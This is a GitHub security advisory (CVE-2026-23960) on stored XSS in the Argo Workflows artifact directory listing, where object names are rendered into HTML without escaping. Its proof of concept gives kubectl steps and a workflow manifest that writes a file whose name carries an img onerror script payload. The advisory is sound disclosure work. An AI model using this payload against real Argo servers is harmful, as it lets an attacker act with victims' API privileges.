# [H] Argo Workflows affected by stored XSS in the artifact directory listing

## Summary
Severity: High
Advisory: GHSA-cv78-6m8q-ph82
CVE: CVE-2026-23960
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-cv78-6m8q-ph82
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=0 <3.6.17
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=3.7.0 <3.7.8
- Go: `github.com/argoproj/argo-workflows` — affected >=0

## Details
### Summary
Stored XSS in the artifact directory listing allows any workflow author to execute arbitrary JavaScript in another user’s browser under the Argo Server origin, enabling API actions with the victim’s privileges.

### Details
The directory listing response in `server/artifacts/artifact_server.go` renders object names directly into HTML via `fmt.Fprintf` without escaping. Object names come from `driver.ListObjects(...)` and are attacker‑controlled when a workflow writes files into an output artifact directory.

https://github.com/argoproj/argo-workflows/blob/9872c296d29dcc5e9c78493054961ede9fc30797/server/artifacts/artifact_server.go#L194-L244

### PoC
1. Deploy Argo Workflows:
```
kubectl create ns argo
kubectl apply --server-side -f manifests/base/crds/full
kubectl apply --server-side -k manifests/quick-start/postgres
```
2. Port‑forward Argo Server:
```
kubectl -n argo port-forward deploy/argo-server 2746:2746
```
3. Create the PoC workflow:
```yml
cat > /tmp/argo-xss.yaml <<'EOF'
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: xss-artifact-test-
spec:
  entrypoint: main
  templates:
  - name: main
    container:
      image: alpine
      command: [sh, -c]
      args:
      - |
        mkdir -p /tmp/artifacts
        touch '/tmp/artifacts/xss"><img src=x onerror="alert(document.domain)">.html'
    outputs:
      artifacts:
      - name: dir
        path: /tmp/artifacts
        archive:
          none: {}
EOF
```
```
kubectl -n argo create -f /tmp/argo-xss.yaml
```
4. Wait for completion:
```
kubectl -n argo get wf -w
```
5. Get the node ID:
```
kubectl -n argo get wf <wf-name> \
  -o jsonpath='{range .status.nodes.*}{.id}{"\t"}{.displayName}{"\n"}{end}'
```
6. Open the listing:
`https://localhost:2746/artifact-files/argo/workflows/<wf-name>/<node-id>/outputs/dir/`

<img width="1220" height="349" alt="image" src="https://github.com/user-attachments/assets/9d859826-c7cd-403b-988e-74695552944b" />

### Impact
- The attacker creates a workflow that produces a HTML artifact that contains a HTML file that contains a script which uses XHR calls to interact with the Argo Server API.
- The attacker emails the deep-link to the artifact to their victim. The victim opens the link, the script starts running.

As the script has access to the Argo Server API (as the victim), so may do the following (if the victim may):
- Read information about the victim’s workflows.
- Create or delete workflows.

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-cv78-6m8q-ph82
- https://nvd.nist.gov/vuln/detail/CVE-2026-23960
- https://github.com/argoproj/argo-workflows/commit/159a5c56285ecd4d3bb0a67aeef4507779a44e17
- https://github.com/argoproj/argo-workflows
- https://github.com/argoproj/argo-workflows/blob/9872c296d29dcc5e9c78493054961ede9fc30797/server/artifacts/artifact_server.go#L194-L244
- https://github.com/argoproj/argo-workflows/releases/tag/v3.6.17
- https://github.com/argoproj/argo-workflows/releases/tag/v3.7.8
